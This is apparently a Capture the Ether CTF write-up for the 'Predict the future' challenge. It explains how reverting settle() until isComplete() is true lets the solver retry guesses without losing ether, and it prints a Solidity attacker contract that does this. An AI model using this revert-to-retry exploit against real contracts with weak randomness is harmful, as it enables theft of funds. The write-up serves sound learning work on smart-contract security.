# Predict the future Capturetheether

## Goals

=> This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.

### Hints

- Note that it is indeed possible to solve this challenge without losing any ether.

### Solution

- My solution is kind of trial and error and the vulnerability is that we can just call the `settle()` function and revert if the `isComplete()` is not true so we could guess as many times as we want without sending 1 ether each guess, I think there should be a way to calculate the `block.timestamp` as well as the blocknumber of 2 block in the future which would be even cheaper than the trial and error method but this one was the easiest way to attack the contract for me.

### Attacker Contract

```solidity
contract Hack {
    PredictTheFutureChallenge predictContract;

    constructor(address _predictContract) {
        predictContract = PredictTheFutureChallenge(_predictContract);
    }

    receive() external payable {}

    function guess(uint8 answer) public payable {
        require(answer >= 0 && answer <= 9);
        predictContract.lockInGuess{value: 1 ether}(answer);
    }

    function attack() public {
        predictContract.settle();
        require(predictContract.isComplete(), "Try again");
        payable(msg.sender).transfer(address(this).balance);
    }

    function showBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```
